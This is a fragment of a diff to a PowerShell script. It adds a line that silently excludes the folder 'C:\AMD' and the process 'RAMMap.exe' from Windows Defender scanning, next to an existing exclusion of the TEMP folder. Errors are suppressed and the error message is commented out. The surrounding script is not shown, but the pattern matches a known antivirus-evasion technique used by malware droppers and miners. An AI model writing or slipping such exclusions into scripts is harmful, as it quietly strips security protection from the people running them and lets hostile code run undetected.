@@ -39,6 +39,8 @@ try {
 # Add Exclusion in Windows Defender with error handling
 try {
     Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "C:\AMD" -ExclusionProcess "RAMMap.exe" -ErrorAction SilentlyContinue
+
 } catch {
     #Write-Output "Error: Unable to add exclusions to Windows Defender."
 }
